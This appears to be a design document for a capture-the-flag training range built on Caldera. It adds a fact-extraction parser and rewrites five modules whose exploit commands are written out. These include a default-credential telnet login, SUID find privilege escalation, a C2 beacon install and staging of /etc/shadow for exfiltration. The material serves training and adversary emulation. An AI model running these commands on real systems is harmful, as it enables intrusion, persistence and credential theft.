# Module Caldera Facts Adoption

**Date:** 2026-08-17

## Purpose

Adopt the native Caldera fact system in the training module catalogue so that module recon and exploit commands are parameterized by facts: recon extracts concrete values into facts, exploit commands inject those values, and cross-module goal exploits gate on prerequisite facts. The change also documents the fact features so the remaining modules can be migrated in later sessions.

This is a partial adoption. A curated set of modules demonstrates the new capabilities; the rest keep the existing default gating and are migrated incrementally using the updated authoring guide.

## Background: the fact system as it stands

The Caldera integration already provides a native fact substrate (see `builder/caldera.py`, `builder/caldera_plugin_app/`, `api/services/caldera.py`):

- **Seeded source facts** — available to any ability without a recon step:
  - `ctf.hostname`, `ctf.ip`, `ctf.os`, `host.id`
  - Seeded into the operation source by `vm_source_facts()` from VM metadata.
- **Recon facts** — trait `ctf.vuln.<module_id>`, auto-emitted by the `ctf_basic` parser when a recon command's output contains the `VULNERABLE` marker. The fact value defaults to the matched output line.
- **Goal facts** — trait `ctf.goal.<goal_id>`, emitted by the `ctf_basic` parser when a goal exploit's output contains `GOAL_ACHIEVED`.
- **Default gating** — an exploit ability that has a recon step automatically gains a `fact_present` requirement on its own recon fact and a `[ -n "#{ctf.vuln.<id>}" ] || ...` guard (`_gate_exploit_command`), so Caldera's planner trims the exploit link until recon confirms the vulnerability.
- **Custom `parser` / `requirements`** — modules may declare `parser` and `requirements` in their caldera `recon`/`exploit` sections. `_ability_parsers`/`_ability_requirements` normalize these, and `caldera_ability.yml.j2` renders arbitrary `custom_parser_vals`, so a new parser module is usable with no template change. `_write_plugin` copytrees the whole `builder/caldera_plugin_app/` directory, so a new parser file is staged automatically.

Current state: no module references `#{...}` facts, declares a custom `parser`/`requirements`, or chains facts across modules. All modules rely solely on the default per-module recon→exploit gating.

## Design

### 1. New regex-extraction parser `ctf_extract`

**File:** `builder/caldera_plugin_app/parsers/ctf_extract.py` (mirrors `ctf_basic.py`).

`ctf_basic` sets a fact's value to the whole matched line, which is unusable as a clean command input. `ctf_extract` captures a token instead.

Behaviour:

- For each output line, and for each mapper, read:
  - `custom_parser_vals.pattern` — required regular expression;
  - `custom_parser_vals.group` — capture-group index, default `1`;
  - `custom_parser_vals.marker` — optional substring the line must contain before matching.
- If the line matches the pattern, emit `Fact(source, <captured group>)`.
- Optional `target`/`edge` produce a relationship, matching `ctf_basic`.

This lets recon emit a machine-readable line (e.g. `VULNERABLE port=23`) and the parser store the clean value (`23`) in the module's recon fact, which the exploit then injects via `#{ctf.vuln.<id>}`.

### 2. Rewrite patterns

Three patterns are applied to the curated modules:

- **Pattern A — cross-module fact gating.** A goal exploit declares `requirements: [{source: ctf.vuln.<prereq>}]` and references `#{ctf.vuln.<prereq>}` in a guard, so it only runs after the prerequisite vulnerability's recon fact exists.
- **Pattern B — seeded-fact parameterization.** Recon/exploit commands reference `#{ctf.ip}`, `#{ctf.hostname}`, or `#{ctf.os}` instead of hardcoding `localhost` or a fixed identity.
- **Pattern C — valued facts.** Recon uses `ctf_extract` to capture a concrete token (port, path, username) into `ctf.vuln.<id>`; the exploit injects that value into its command.

### 3. Module rewrites

Five modules are rewritten (the curated shortlist). `deface_website` is left unchanged because its prerequisite is an application module, which emits no recon fact to gate on.

#### `open_telnet` (vulnerability, initial-access) — Patterns B + C

Recon discovers the listening port; the exploit connects to that port on the seeded VM IP.

```yaml
caldera:
  recon:
    description: "Discover the listening telnet port"
    parser:
      - module: plugins.ctf-exploit.app.parsers.ctf_extract
        mappings:
          - source: ctf.vuln.open_telnet
            custom_parser_vals: { marker: VULNERABLE, pattern: "port=(\\d+)" }
    command: |
      PORT=$(ss -tlnp 2>/dev/null | grep -E ':23\b' | grep -oP ':(\d+)\b' | head -1 | tr -d ':')
      [ -n "$PORT" ] && echo "VULNERABLE port=$PORT" || echo "SECURE: port 23 is not listening"
  exploit:
    description: "Connect to the discovered telnet port and attempt login with default credentials"
    command: |
      PORT="#{ctf.vuln.open_telnet}"
      (printf 'root\nchangeme123\n' | timeout 5 nc -q 3 #{ctf.ip} "${PORT}") 2>/dev/null | head -10 \
        || echo "Telnet open on #{ctf.ip}:${PORT} (connect manually for interactive login)"
```

#### `suid_find` (vulnerability, privilege-escalation) — Pattern C

Recon discovers the SUID `find` binary path; the exploit executes it.

```yaml
caldera:
  recon:
    description: "Discover the SUID find binary path"
    parser:
      - module: plugins.ctf-exploit.app.parsers.ctf_extract
        mappings:
          - source: ctf.vuln.suid_find
            custom_parser_vals: { marker: VULNERABLE, pattern: "path=(\\S+)" }
    command: |
      BIN=$(find / -perm -4000 -name find -type f 2>/dev/null | head -1)
      [ -n "$BIN" ] && echo "VULNERABLE path=$BIN" || echo "SECURE: find has normal permissions"
  exploit:
    description: "Escalate privileges via the discovered SUID find -exec"
    command: |
      BIN="#{ctf.vuln.suid_find}"
      "$BIN" /tmp -maxdepth 0 -exec whoami \;
```

#### `weak_ssh_credentials` (vulnerability, initial-access) — Pattern C

Recon discovers the weak account name; the exploit authenticates as that account.

```yaml
caldera:
  recon:
    description: "Discover the weak-credential account"
    parser:
      - module: plugins.ctf-exploit.app.parsers.ctf_extract
        mappings:
          - source: ctf.vuln.weak_ssh_credentials
            custom_parser_vals: { marker: VULNERABLE, pattern: "user=(\\S+)" }
    command: |
      id svc-monitor >/dev/null 2>&1 && echo "VULNERABLE user=svc-monitor" || echo "SECURE: account not found"
  exploit:
    description: "Authenticate using the discovered weak account to establish a foothold"
    command: |
      USER="#{ctf.vuln.weak_ssh_credentials}"
      su -c "id && grep '$USER' /etc/passwd" "$USER"
```

#### `install_c2` (goal, command-and-control) — Pattern A

The exploit gates on `nopasswd_sudo`'s recon fact before invoking `sudo`.

```yaml
caldera:
  exploit:
    description: "Install a persistent beacon via systemd service"
    requirements:
      - source: ctf.vuln.nopasswd_sudo
    command: |
      [ -n "#{ctf.vuln.nopasswd_sudo}" ] || { echo "SKIPPED: passwordless sudo not confirmed"; exit 0; }
      sudo bash ./install_c2.sh
    payloads:
      - install_c2.sh
```

#### `exfil_shadow` (goal, credential-access) — Pattern A

The exploit gates on `world_writable_shadow`'s recon fact before reading `/etc/shadow`.

```yaml
caldera:
  exploit:
    description: "Read /etc/shadow and stage it for exfiltration"
    requirements:
      - source: ctf.vuln.world_writable_shadow
    command: |
      [ -n "#{ctf.vuln.world_writable_shadow}" ] || { echo "SKIPPED: shadow file is not world-readable"; exit 0; }
      cat /etc/shadow > /tmp/.exfil_shadow && echo "GOAL_ACHIEVED: shadow file staged at /tmp/.exfil_shadow"
```

The goal exploits continue to emit `GOAL_ACHIEVED`, so their existing `ctf.goal.<id>` objective detection is unchanged. The `#{}` guard is defense-in-depth; the `fact_present` requirement is what causes the planner to trim the link until the prerequisite recon confirms.

### 4. Documentation update

`MODULE_GUIDE.md` currently documents no Caldera metadata at all. It is updated so a future session can migrate the remaining modules:

- Optional-field table gains `stage`, `supported_bases`, `min_ram_mb`, `min_vcpu`.
- New **"Caldera Metadata"** section: `tactic`, `technique`, `recon`/`exploit` (`description`, `command`, `cleanup`, `payloads`, `uploads`), `phase_override`.
- New **"Caldera Facts & Gating"** section:
  - seed facts (`ctf.hostname`, `ctf.ip`, `ctf.os`, `host.id`);
  - `VULNERABLE` → `ctf.vuln.<id>` and `GOAL_ACHIEVED` → `ctf.goal.<id>` markers;
  - `#{fact}` substitution in commands;
  - custom `parser` (`ctf_basic` default vs `ctf_extract` with `pattern`/`group`);
  - custom `requirements` (`fact_present`) for cross-module gating.
- New goal-module section (`red_points`, `defend_points`, `revert_verification`) and `goal` added to the valid type-key list.

## Scope boundaries

- Only the five modules above are rewritten in this change; the remaining caldera modules keep default gating.
- Only one new file is added to `builder/caldera_plugin_app/`; `builder/caldera.py`, the ability template, and the adversary/objective templates are unchanged.
- No changes to module selection, scoring, operation-plan validation, or the attack-tree/objective generation logic.
- The 75-module `supported_bases`/`phase_override` annotation and its guard tests (from the prior change) remain in place.

## Verification

Tests (written first, TDD):

- `ctf_extract` parser: extracts the configured capture group into a fact value; respects `marker`; emits no fact when the pattern does not match.
- Builder: a module declaring `parser: {module: plugins.ctf-exploit.app.parsers.ctf_extract, source, custom_parser_vals}` produces the correct ability parser mappings.
- Builder: a goal exploit declaring `requirements: [{source: ctf.vuln.<prereq>}]` is preserved verbatim and is not auto-gated (no recon step).
- Module loader: the five rewritten modules parse and resolve to the expected facts/requirements.

Authoritative regression coverage is the disposable Docker test service (`docker compose --profile test run --rm tests`), plus the existing attack-tree, caldera-builder, and operation-plan suites. Local `pytest` is used for fast red/green cycles.

## Acceptance criteria

- A new `ctf_extract` parser exists and is staged into generated plugins.
- The five curated modules reference facts in their commands and pass the full test suite.
- Goal exploits gate on their prerequisite vulnerability's recon fact via a `fact_present` requirement and `#{...}` guard.
- `MODULE_GUIDE.md` documents `caldera` metadata, facts, `#{}` substitution, custom `parser`/`requirements`, `phase_override`, `supported_bases`, `stage`, and goal-module fields, so the remaining modules can be migrated in later sessions.
- No existing behaviour (selection, scoring, objectives, operation planning) regresses.
